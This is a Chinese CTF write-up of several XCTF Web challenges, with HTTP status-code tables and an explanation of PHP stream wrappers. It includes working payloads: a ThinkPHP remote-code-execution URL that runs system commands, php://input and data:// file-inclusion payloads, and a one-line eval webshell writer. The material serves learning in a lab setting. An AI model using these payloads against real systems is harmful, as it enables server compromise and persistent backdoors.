# 攻防世界Web刷题记录(进阶区)

## 1.baby_web

发现去掉URLhttp://111.200.241.244:51461/1.php后面的1.php，还是会跳转到http://111.200.241.244:51461/1.php

为啥？查看网络

![image-20210304133349779](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041803902.png)

访问111.200.241.244，响应状态码是302，HTTP状态码302 表示临时性重定向，所以会被重定向到服务器希望我们访问的页面，即111.200.241.244/1.php

![image-20210304133641176](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041803712.png)

HTTP状态码相关知识：

| 分类 | 分类描述                                       |
| ---- | ---------------------------------------------- |
| 1**  | 信息，服务器收到请求，需要请求者继续执行操作   |
| 2**  | 成功，操作被成功接收并处理                     |
| 3**  | 重定向，需要进一步的操作以完成请求             |
| 4**  | 客户端错误，请求包含语法错误或无法完成请求     |
| 5**  | 服务器错误，服务器在处理请求的过程中发生了错误 |

HTTP状态码列表:

| 状态码 | 状态码英文名称                  | 中文描述                                                     |
| ------ | ------------------------------- | ------------------------------------------------------------ |
| 100    | Continue                        | 继续。客户端应继续其请求                                     |
| 101    | Switching Protocols             | 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 |
|        |                                 |                                                              |
| 200    | OK                              | 请求成功。一般用于GET与POST请求                              |
| 201    | Created                         | 已创建。成功请求并创建了新的资源                             |
| 202    | Accepted                        | 已接受。已经接受请求，但未处理完成                           |
| 203    | Non-Authoritative Information   | 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 |
| 204    | No Content                      | 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 |
| 205    | Reset Content                   | 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 |
| 206    | Partial Content                 | 部分内容。服务器成功处理了部分GET请求                        |
|        |                                 |                                                              |
| 300    | Multiple Choices                | 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 |
| 301    | Moved Permanently               | 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，**浏览器会自动定向到新URI**。今后任何新的请求都应使用新的URI代替 |
| 302    | Found                           | 临时移动。与301类似。但资源只是临时被移动。详细来说，301和302状态码都表示重定向，就是说浏览器在拿到服务器返回的这个状态码后会自动跳转到一个新的URL地址，这个地址可以从响应的Location首部中获取（用户看到的效果就是他输入的地址A瞬间变成了另一个地址B）——这是它们的共同点。他们的不同在于。301表示旧地址A的资源已经被永久地移除了（这个资源不可访问了），**搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址**；302表示旧地址A的资源还在（仍然可以访问），这个重定向只是临时地从旧地址A跳转到地址B，**搜索引擎会抓取新的内容而保存旧的网址。** |
| 303    | See Other                       | 查看其它地址。与301类似。使用GET和POST请求查看               |
| 304    | Not Modified                    | 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |
| 305    | Use Proxy                       | 使用代理。所请求的资源必须通过代理访问                       |
| 306    | Unused                          | 已经被废弃的HTTP状态码                                       |
| 307    | Temporary Redirect              | 临时重定向。与302类似。使用GET请求重定向                     |
|        |                                 |                                                              |
| 400    | Bad Request                     | 客户端请求的语法错误，服务器无法理解                         |
| 401    | Unauthorized                    | 请求要求用户的身份认证                                       |
| 402    | Payment Required                | 保留，将来使用                                               |
| 403    | Forbidden                       | 服务器理解请求客户端的请求，但是拒绝执行此请求               |
| 404    | Not Found                       | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置"您所请求的资源无法找到"的个性页面 |
| 405    | Method Not Allowed              | 客户端请求中的方法被禁止                                     |
| 406    | Not Acceptable                  | 服务器无法根据客户端请求的内容特性完成请求                   |
| 407    | Proxy Authentication Required   | 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 |
| 408    | Request Time-out                | 服务器等待客户端发送的请求时间过长，超时                     |
| 409    | Conflict                        | 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 |
| 410    | Gone                            | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |
| 411    | Length Required                 | 服务器无法处理客户端发送的不带Content-Length的请求信息       |
| 412    | Precondition Failed             | 客户端请求信息的先决条件错误                                 |
| 413    | Request Entity Too Large        | 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |
| 414    | Request-URI Too Large           | 请求的URI过长（URI通常为网址），服务器无法处理               |
| 415    | Unsupported Media Type          | 服务器无法处理请求附带的媒体格式                             |
| 416    | Requested range not satisfiable | 客户端请求的范围无效                                         |
| 417    | Expectation Failed              | 服务器无法满足Expect的请求头信息                             |
|        |                                 |                                                              |
| 500    | Internal Server Error           | 服务器内部错误，无法完成请求                                 |
| 501    | Not Implemented                 | 服务器不支持请求的功能，无法完成请求                         |
| 502    | Bad Gateway                     | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |
| 503    | Service Unavailable             | 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |
| 504    | Gateway Time-out                | 充当网关或代理的服务器，未及时从远端服务器获取请求           |
| 505    | HTTP Version not supported      | **服务器不支持请求的**HTTP协议的版本，无法完成处理           |

## 2.Training-WWW-Robots

就这

![image-20210304141552596](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804072.png)

![image-20210304141634067](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804362.png)

## 3.php_rce

何谓rce?

***RCE***英文全称:remote command/code execute,远程指令/代码执行

![image-20210304142110418](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804323.png)

**遇到一个完整的框架，就要去搜一下它存在什么漏洞**

还不会分析漏洞……但也没关系，百度到一个payload

![image-20210304143659962](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804224.png)

修改一下

[http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22](http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22)

找到了再cat flag

[http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag](http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag)

![image-20210304144403524](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804704.png)

## 4.Web_php_include

看到代码：

![image-20210304151733263](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804577.png)

**php中，`include` 语句包含并运行指定文件**

关于php伪协议，具体可以阅读https://segmentfault.com/a/1190000018991087和https://www.cnblogs.com/-mo-/p/11736445.html

这里列出两点：

### 1.`php://input`用于**执行php代码**

`php://` 用于访问各个输入/输出流（I/O streams）PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

示例：

`php://input + [POST DATA]`执行php代码

```
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php phpinfo(); ?>
```

![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804813.jpeg)

若有写入权限，写入一句话木马

```
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```

![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804431.jpeg)

### 2.`PHP>=5.2.0`可以使用`data://`数据流封装器，以传递相应格式的数据，用来执行PHP代码

示例：

#### 1.data://text/plain,

```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```

![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804460.jpeg)

#### 2.data://text/plain;base64,

```
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804792.jpeg)

回到本题

![image-20210304154949956](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804666.png)

可以看到对php://做了过滤，将“php://”替换成了""，所以采用data://text/plain对我们要执行的命令进行封装，并提供给page变量，命令被包含在include($page);的地方并被执行。

先执行system("ls");,看看当前目录下有啥文件http://111.200.241.244:35140/?page=data://text/plain,%3C?php%20system(%22ls%22);?%3E

![image-20210304155722010](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804217.png)

然后system("cat fl4gisisish3r3.php");

啥也没显示，flag在哪里？

![image-20210304155843876](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804329.png)

在这里

![image-20210304155905379](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804883.png)

据说和阿帕奇服务器的安全机制有关，这里不再赘述。

这样写也行，用file_get_contents()函数将文件内容读入$a,再将$a显示在页面上，若不使用hemispecialchars函数，同样不显示在页面上，而是在源码中。

![image-20210304160603002](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804750.png)

本题采用大小写绕过也是可以的,将php换成phP一样可以post命令过去然后执行

![image-20210304161235246](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804877.png)

![image-20210304161359557](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804748.png)

![image-20210304161410701](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804901.png)

